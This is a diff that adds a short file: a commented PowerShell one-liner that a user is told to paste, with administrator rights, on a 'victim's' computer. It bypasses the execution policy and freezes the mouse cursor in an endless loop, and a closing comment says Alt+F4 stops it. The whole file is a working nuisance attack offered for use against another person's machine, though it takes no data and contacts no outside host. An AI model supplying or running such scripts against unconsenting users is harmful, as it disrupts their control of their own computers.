@@ -1,0 +1,5 @@
+#Run Powershell as admistration on Victim's computer and paste 
+
+powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; $frozenPos=[System.Windows.Forms.Cursor]::Position; while ($true) { [System.Windows.Forms.Cursor]::Position=$frozenPos; Start-Sleep -m 1 }"
+
+#To stop click ALT + F4
